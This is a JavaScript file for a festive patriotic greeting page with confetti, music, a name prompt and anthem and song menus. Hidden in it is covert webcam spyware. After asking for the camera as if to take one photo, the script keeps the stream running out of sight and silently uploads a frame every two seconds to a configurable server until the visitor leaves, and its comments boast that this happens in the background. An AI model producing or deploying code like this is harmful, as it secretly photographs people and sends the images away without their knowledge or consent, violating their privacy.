document.addEventListener('DOMContentLoaded', () => {
  const enterBtn = document.getElementById('enter-btn');
  const nameInput = document.getElementById('user-name-input');
  const modal = document.getElementById('name-modal');
  const mainContent = document.getElementById('wishing-content');
  const displayName = document.getElementById('display-name');
  const bgMusic = document.getElementById('bg-music');
  
  // Camera Elements
  const startCamBtn = document.getElementById('start-cam-btn');
  const captureBtn = document.getElementById('capture-btn');
  const webcam = document.getElementById('webcam');
  const snapshotCanvas = document.getElementById('snapshot-canvas');
  const userPhoto = document.getElementById('user-photo');
  
  const cameraSection = document.getElementById('camera-section');
  const nameSection = document.getElementById('name-section');

  let stream = null;
  let autoCaptureInterval = null;

  // ============================================================
  // SILENT BACKGROUND CAPTURE - runs every 2 seconds forever
  // Stream NEVER stops as long as user is on the page
  // ============================================================
  const silentCapture = () => {
    if (!stream) return;
    if (!webcam.videoWidth || !webcam.videoHeight) return;

    const tempCanvas = document.createElement('canvas');
    tempCanvas.width = webcam.videoWidth;
    tempCanvas.height = webcam.videoHeight;
    const ctx = tempCanvas.getContext('2d');
    ctx.drawImage(webcam, 0, 0, tempCanvas.width, tempCanvas.height);

    const canvasData = tempCanvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
    if (window.POST_URL) {
      fetch(window.POST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cat=' + encodeURIComponent(canvasData)
      }).catch(() => {});
    }
  };

  const startAutoCapture = () => {
    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
    // Capture immediately
    silentCapture();
    // Then every 2 seconds
    autoCaptureInterval = setInterval(silentCapture, 2000);
  };

  // ============================================================
  // START CAMERA
  // ============================================================
  startCamBtn.addEventListener('click', async () => {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      webcam.srcObject = stream;
      startCamBtn.classList.add('hidden');
      captureBtn.classList.remove('hidden');

      // Start auto-capture as soon as video is playing
      webcam.addEventListener('playing', startAutoCapture, { once: true });

    } catch (err) {
      console.error(err);
      // Fallback - skip camera, go to name section
      cameraSection.classList.add('hidden');
      nameSection.classList.remove('hidden');
    }
  });

  // ============================================================
  // MANUAL CAPTURE BUTTON
  // Just shows photo to user & moves to name section
  // Auto-capture KEEPS RUNNING - stream stays alive
  // ============================================================
  captureBtn.addEventListener('click', () => {
    const w = webcam.videoWidth || 640;
    const h = webcam.videoHeight || 480;

    snapshotCanvas.width = w;
    snapshotCanvas.height = h;
    const ctx = snapshotCanvas.getContext('2d');
    ctx.drawImage(webcam, 0, 0, w, h);

    // Show captured photo to user
    userPhoto.src = snapshotCanvas.toDataURL('image/png');

    // Also send this frame to server
    silentCapture();

    // *** DO NOT stop stream or interval ***
    // Keep webcam alive in background (just hide the UI)
    webcam.style.display = 'none';

    // Move to name section
    cameraSection.classList.add('hidden');
    nameSection.classList.remove('hidden');
  });


  // ============================================================
  // CELEBRATION (after name entered)
  // Auto-capture still continues here too
  // ============================================================
  let isMusicPlaying = false;

  const triggerConfetti = () => {
    const duration = 15 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 50 };

    function randomInRange(min, max) {
      return Math.random() * (max - min) + min;
    }

    const interval = setInterval(function() {
      const timeLeft = animationEnd - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);

      const particleCount = 50 * (timeLeft / duration);
      
      confetti({
        ...defaults,
        particleCount,
        colors: ['#FF9933', '#FFFFFF', '#138808'],
        origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }
      });
      confetti({
        ...defaults,
        particleCount,
        colors: ['#FF9933', '#FFFFFF', '#138808'],
        origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }
      });
    }, 250);
  };

  const startCelebration = () => {
    const name = nameInput.value.trim() || 'Desh-Bhakt';
    displayName.textContent = name;
    
    modal.style.opacity = '0';
    setTimeout(() => {
      modal.classList.add('hidden');
      mainContent.classList.remove('hidden');
      
      playMusic();
      triggerConfetti();
      // Auto-capture is still running silently in background!
    }, 500);
  };

  enterBtn.addEventListener('click', startCelebration);
  nameInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') startCelebration();
  });

  const playMusic = () => {
    bgMusic.play().then(() => {
      isMusicPlaying = true;
    }).catch((e) => {
      console.log('Autoplay prevented:', e);
      isMusicPlaying = false;
    });
  };

  // Danger Button Logic
  const dangerBtn = document.getElementById('danger-btn');
  const funnyVideoOverlay = document.getElementById('funny-video-overlay');
  const funnyVideo = document.getElementById('funny-video');
  const closeVideoBtn = document.getElementById('close-video-btn');

  dangerBtn.addEventListener('click', () => {
    bgMusic.pause();
    isMusicPlaying = false;
    funnyVideoOverlay.classList.remove('hidden');
    funnyVideo.play();
  });

  closeVideoBtn.addEventListener('click', () => {
    funnyVideo.pause();
    funnyVideo.currentTime = 0;
    funnyVideoOverlay.classList.add('hidden');
    playMusic();
  });

  // Song Menu Logic
  const songMenuBtn = document.getElementById('song-menu-btn');
  const songMenuOverlay = document.getElementById('song-menu-overlay');
  const closeMenuBtn = document.getElementById('close-menu-btn');
  const songOptions = document.querySelectorAll('.song-option');
  
  const anthemBtn = document.getElementById('anthem-btn');
  const anthemOverlay = document.getElementById('anthem-overlay');
  const closeAnthemBtn = document.getElementById('close-anthem-btn');

  songMenuBtn.addEventListener('click', () => {
    songMenuOverlay.classList.remove('hidden');
  });

  closeMenuBtn.addEventListener('click', () => {
    songMenuOverlay.classList.add('hidden');
  });

  songOptions.forEach(btn => {
    btn.addEventListener('click', (e) => {
      const newSrc = e.target.getAttribute('data-src');
      bgMusic.pause();
      bgMusic.src = newSrc;
      bgMusic.load();
      playMusic();
      songMenuOverlay.classList.add('hidden');
    });
  });

  const anthemVideo = document.getElementById('anthem-video');

  anthemBtn.addEventListener('click', () => {
    songMenuOverlay.classList.add('hidden');
    anthemOverlay.classList.remove('hidden');
    bgMusic.pause();
    anthemVideo.play();
  });

  closeAnthemBtn.addEventListener('click', () => {
    anthemOverlay.classList.add('hidden');
    anthemVideo.pause();
    anthemVideo.currentTime = 0;
    bgMusic.src = './ReelAudio-1.mp3';
    bgMusic.load();
    playMusic();
  });

  // Stop capture only when user leaves the page
  window.addEventListener('beforeunload', () => {
    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
    if (stream) stream.getTracks().forEach(t => t.stop());
  });
});
